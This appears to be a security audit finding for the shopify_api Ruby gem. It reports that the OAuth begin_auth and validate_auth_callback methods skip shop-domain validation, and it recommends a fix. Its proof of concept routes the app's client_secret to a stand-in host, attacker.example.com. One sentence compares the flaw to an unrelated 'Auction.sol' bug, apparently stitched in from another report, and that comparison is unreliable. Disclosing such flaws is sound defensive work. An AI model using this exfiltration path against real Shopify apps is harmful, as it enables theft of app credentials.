### Title
OAuth `shop` parameter is never validated against `ShopValidator`, letting an attacker redirect the app's `client_secret` to a host of their choosing - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback` both take a `shop:` argument and use it directly to build the URL that receives the app's `client_id`/`client_secret` (`auth_base_uri(shop)`), without ever passing it through `Utils::ShopValidator.sanitize!`. Every other credential-exchange entry point in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) explicitly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the request, but `Oauth` does not.

### Finding Description
`begin_auth` builds the authorize redirect purely from the caller-supplied `shop` string: [1](#0-0) 
and `validate_auth_callback` uses `auth_query.shop` (part of the `AuthQuery` struct built from the raw callback query string) to instantiate the `Session`/`HttpClient` used to POST the token-exchange body containing `client_id`/`client_secret`: [2](#0-1) 

The only check performed on the callback is HMAC integrity via `Utils::HmacValidator.validate(auth_query)`: [3](#0-2) 
and the `shop` field is itself one of the fields *covered* by that HMAC: [4](#0-3) 
So the HMAC binds "the `shop` value the caller passes in" to "the `shop` value the server used to sign," but it never binds it to "a real, trusted Shopify domain." This is the exact identity-binding gap the report describes for the `Auction.sol` bug: a value that participates in a signed/verified flow but has no independent bound-checking of its legitimacy (there, the expiry duration was unbounded; here, the `shop` domain used to build the credential-carrying URL is unbounded).

By contrast, sibling flows in the same file tree treat this as mandatory: [5](#0-4) [6](#0-5) [7](#0-6) 

`Utils::ShopValidator` exists specifically to reject non-Shopify hosts: [8](#0-7) 

### Impact Explanation
This maps to the "High - SSRF with the app's credentials" category. Because `Oauth.begin_auth`/`validate_auth_callback` never sanitize `shop`, a host application that (as is typical for a multi-tenant Shopify app) takes the `shop` value from the install-initiation request or from the OAuth callback query string and forwards it as-is into these gem methods will have the gem itself construct `https://<shop>/admin/oauth/access_token` and POST `client_id`+`client_secret` to whatever host is in `shop`, without the gem enforcing any myshopify/spin.dev/shop.dev domain restriction the way it does for every other grant type.

### Likelihood Explanation
Exploitability from an unprivileged internet user's perspective depends on how directly the host app passes the `shop` param through — the `shop` used to build `auth_base_uri` in `begin_auth` is not part of any signed payload at all, so if the host app calls `begin_auth(shop: params[:shop])` (a very common integration pattern for the "enter your shop domain" login page), an attacker can supply an arbitrary hostname and trigger an SSRF-style outbound request originating from the app server. For `validate_auth_callback`, `auth_query.shop` is HMAC-covered together with the rest of the query, which somewhat reduces likelihood since the value must match what was HMAC-signed by whoever generates a valid `auth_query` (normally Shopify) — but the gem provides no independent verification that `shop` is a real Shopify domain in either path, which is inconsistent with the rest of the auth surface and is the root cause the fix should target.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) at the top of both `Oauth.begin_auth` and `Oauth.validate_auth_callback`, using the sanitized value everywhere `shop` is subsequently used (redirect URI construction, `auth_base_uri`, `Session.new`/`Session.from`), mirroring the pattern already used in `ClientCredentials`, `RefreshToken`, and `TokenExchange`.

### Proof of Concept
1. Host app (using this gem) exposes `/login?shop=<value>` and calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: params[:shop], redirect_path: "/auth/callback")`.
2. Attacker requests `/login?shop=attacker.example.com`.
3. `auth_base_uri("attacker.example.com")` returns `https://attacker.example.com/admin`, and the generated `auth_route` is returned to the caller unmodified — no `ShopValidator` check ever runs. If the host app also blindly threads this `shop` value into a later `validate_auth_callback` call (or another gem method lacking sanitization), the eventual `client.request(...)` in `validate_auth_callback` will POST `client_id`/`client_secret` to `https://attacker.example.com/admin/oauth/access_token`, exfiltrating the app's `client_secret` to the attacker-controlled host.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-98)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

**File:** lib/shopify_api/auth/oauth.rb (L117-128)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")
          admin_host = admin_web.host!(nonstandard_host_prefix: "admin")
          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
        end
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-22)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** lib/shopify_api/auth/client_credentials.rb (L20-26)
```ruby
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L19-25)
```ruby
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/token_exchange.rb (L98-104)
```ruby
          unless ShopifyAPI::Context.setup?
            raise ShopifyAPI::Errors::ContextNotSetupError,
              "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end

          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/shop_validator.rb (L9-64)
```ruby
      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
```
